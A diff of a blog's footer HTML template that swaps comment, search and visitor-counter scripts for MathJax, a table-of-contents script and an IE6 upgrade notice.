-  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
-
-
-  
-
-
-  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
-
-  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
-
-
-
-  
-  
-
-
-  <script type="text/javascript" src="/js/src/affix.js?v=5.1.0"></script>
-
-  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.0"></script>
-
-
-
-  
-  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
-<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
-
-
-
-  
-
-
-  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
-
-
-
-  
-
-  
-    
-  
-
-  <script type="text/javascript">
-    var duoshuoQuery = {short_name:"zeroyu.duoshuo.com"};
-    (function() {
-      var ds = document.createElement('script');
-      ds.type = 'text/javascript';ds.async = true;
-      ds.id = 'duoshuo-script';
-      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
-      ds.charset = 'UTF-8';
-      (document.getElementsByTagName('head')[0]
-      || document.getElementsByTagName('body')[0]).appendChild(ds);
-    })();
-  </script>
-
-  
-    
-    
-    <script src="/lib/ua-parser-js/dist/ua-parser.min.js?v=0.7.9"></script>
-    <script src="/js/src/hook-duoshuo.js"></script>
-  
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  
-  <script type="text/javascript">
-    // Popup Window;
-    var isfetched = false;
-    // Search DB path;
-    var search_path = "search.xml";
-    if (search_path.length == 0) {
-      search_path = "search.xml";
-    }
-    var path = "/" + search_path;
-    // monitor main search box;
-
-    function proceedsearch() {
-      $("body").append('<div class="popoverlay">').css('overflow', 'hidden');
-      $('.popup').toggle();
-    }
-    // search function;
-    var searchFunc = function(path, search_id, content_id) {
-      'use strict';
-      $.ajax({
-        url: path,
-        dataType: "xml",
-        async: true,
-        success: function( xmlResponse ) {
-          // get the contents from search data
-          isfetched = true;
-          $('.popup').detach().appendTo('.header-inner');
-          var datas = $( "entry", xmlResponse ).map(function() {
-            return {
-              title: $( "title", this ).text(),
-              content: $("content",this).text(),
-              url: $( "url" , this).text()
-            };
-          }).get();
-          var $input = document.getElementById(search_id);
-          var $resultContent = document.getElementById(content_id);
-          $input.addEventListener('input', function(){
-            var matchcounts = 0;
-            var str='<ul class=\"search-result-list\">';
-            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
-            $resultContent.innerHTML = "";
-            if (this.value.trim().length > 1) {
-              // perform local searching
-              datas.forEach(function(data) {
-                var isMatch = false;
-                var content_index = [];
-                var data_title = data.title.trim().toLowerCase();
-                var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
-                var data_url = decodeURIComponent(data.url);
-                var index_title = -1;
-                var index_content = -1;
-                var first_occur = -1;
-                // only match artiles with not empty titles and contents
-                if(data_title != '') {
-                  keywords.forEach(function(keyword, i) {
-                    index_title = data_title.indexOf(keyword);
-                    index_content = data_content.indexOf(keyword);
-                    if( index_title >= 0 || index_content >= 0 ){
-                      isMatch = true;
-                      if (i == 0) {
-                        first_occur = index_content;
-                      }
-                    }
-
-                  });
-                }
-                // show search results
-                if (isMatch) {
-                  matchcounts += 1;
-                  str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
-                  var content = data.content.trim().replace(/<[^>]+>/g,"");
-                  if (first_occur >= 0) {
-                    // cut out 100 characters
-                    var start = first_occur - 20;
-                    var end = first_occur + 80;
-                    if(start < 0){
-                      start = 0;
-                    }
-                    if(start == 0){
-                      end = 50;
-                    }
-                    if(end > content.length){
-                      end = content.length;
-                    }
-                    var match_content = content.substring(start, end);
-                    // highlight all keywords
-                    keywords.forEach(function(keyword){
-                      var regS = new RegExp(keyword, "gi");
-                      match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
-                    });
-
-                    str += "<p class=\"search-result\">" + match_content +"...</p>"
-                  }
-                  str += "</li>";
-                }
-              })};
-            str += "</ul>";
-            if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
-            if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
-            $resultContent.innerHTML = str;
-          });
-          proceedsearch();
-        }
-      });}
-
-    // handle and trigger popup window;
-    $('.popup-trigger').click(function(e) {
-      e.stopPropagation();
-      if (isfetched == false) {
-        searchFunc(path, 'local-search-input', 'local-search-result');
-      } else {
-        proceedsearch();
-      };
-    });
-
-    $('.popup-btn-close').click(function(e){
-      $('.popup').hide();
-      $(".popoverlay").remove();
-      $('body').css('overflow', '');
-    });
-    $('.popup').click(function(e){
-      e.stopPropagation();
-    });
-  </script>
-
-
-  
-
-  
-
-  
-  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
-  <script>AV.initialize("KY6fzHpNYVDAlWLyfhKdz5OA-gzGzoHsz", "IlxIqswmBd92jfiSvOIQSLf5");</script>
-  <script>
-    function showTime(Counter) {
-      var query = new AV.Query(Counter);
-      var entries = [];
-      var $visitors = $(".leancloud_visitors");
-
-      $visitors.each(function () {
-        entries.push( $(this).attr("id").trim() );
-      });
-
-      query.containedIn('url', entries);
-      query.find()
-        .done(function (results) {
-          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
-
-          if (results.length === 0) {
-            $visitors.find(COUNT_CONTAINER_REF).text(0);
-            return;
-          }
-
-          for (var i = 0; i < results.length; i++) {
-            var item = results[i];
-            var url = item.get('url');
-            var time = item.get('time');
-            var element = document.getElementById(url);
-
-            $(element).find(COUNT_CONTAINER_REF).text(time);
-          }
-          for(var i = 0; i < entries.length; i++) {
-            var url = entries[i];
-            var element = document.getElementById(url);
-            var countSpan = $(element).find(COUNT_CONTAINER_REF);
-            if( countSpan.text() == '') {
-              countSpan.text(0);
-            }
-          }
-        })
-        .fail(function (object, error) {
-          console.log("Error: " + error.code + " " + error.message);
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <script type="text/javascript"> 
+        $(document).ready(function(){
+            MathJax.Hub.Config({ 
+                tex2jax: {inlineMath: [['[latex]','[/latex]'], ['\\(','\\)']]} 
+            });
         });
-    }
+    </script>
 
-    function addCount(Counter) {
-      var $visitors = $(".leancloud_visitors");
-      var url = $visitors.attr('id').trim();
-      var title = $visitors.attr('data-flag-title').trim();
-      var query = new AV.Query(Counter);
 
-      query.equalTo("url", url);
-      query.find({
-        success: function(results) {
-          if (results.length > 0) {
-            var counter = results[0];
-            counter.fetchWhenSave(true);
-            counter.increment("time");
-            counter.save(null, {
-              success: function(counter) {
-                var $element = $(document.getElementById(url));
-                $element.find('.leancloud-visitors-count').text(counter.get('time'));
-              },
-              error: function(counter, error) {
-                console.log('Failed to save Visitor num, with error message: ' + error.message);
-              }
+    
+
+    <script src="/js/awesome-toc.min.js"></script>
+    <script>
+        $(document).ready(function(){
+            $.awesome_toc({
+                overlay: true,
+                contentId: "post-content",
             });
-          } else {
-            var newcounter = new Counter();
-            /* Set ACL */
-            var acl = new AV.ACL();
-            acl.setPublicReadAccess(true);
-            acl.setPublicWriteAccess(true);
-            newcounter.setACL(acl);
-            /* End Set ACL */
-            newcounter.set("title", title);
-            newcounter.set("url", url);
-            newcounter.set("time", 1);
-            newcounter.save(null, {
-              success: function(newcounter) {
-                var $element = $(document.getElementById(url));
-                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
-              },
-              error: function(newcounter, error) {
-                console.log('Failed to create');
-              }
-            });
-          }
-        },
-        error: function(error) {
-          console.log('Error:' + error.code + " " + error.message);
-        }
-      });
-    }
-
-    $(function() {
-      var Counter = AV.Object.extend("Counter");
-      if ($('.leancloud_visitors').length == 1) {
-        addCount(Counter);
-      } else if ($('.post-title-link').length > 1) {
-        showTime(Counter);
-      }
-    });
-  </script>
+        });
+    </script>
 
 
-
-  
-
-  
-
+    
+    
+    <!--kill ie6 -->
+<!--[if IE 6]>
+  <script src="//letskillie6.googlecode.com/svn/trunk/2/zh_CN.js"></script>
+<![endif]-->
 
 </body>
 </html>
